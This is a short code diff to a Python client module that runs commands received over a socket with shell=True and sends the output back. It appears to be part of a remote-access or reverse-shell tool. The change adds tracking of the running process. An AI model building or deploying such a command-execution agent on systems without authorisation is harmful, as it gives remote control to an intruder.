@@ -4,7 +4,7 @@ import threading
 from client.core.protocol import reliable_send
 
 
-def run_command(sock, command):
+def run_command(sock, command, proc_holder=None):
     try:
         proc = subprocess.Popen(
             command, shell=True,
@@ -12,6 +12,8 @@ def run_command(sock, command):
             stderr=subprocess.PIPE,
             stdin=subprocess.PIPE
         )
+        if proc_holder is not None:
+            proc_holder['proc'] = proc
         stdout_value, stderr_value = proc.communicate()
         result = stdout_value + stderr_value
         try:
@@ -21,6 +23,9 @@ def run_command(sock, command):
         reliable_send(sock, result)
     except Exception as e:
         reliable_send(sock, f'[-] Error executing command: {str(e)}')
+    finally:
+        if proc_holder is not None:
+            proc_holder['proc'] = None
 
 
 def run_command_async(sock, command):
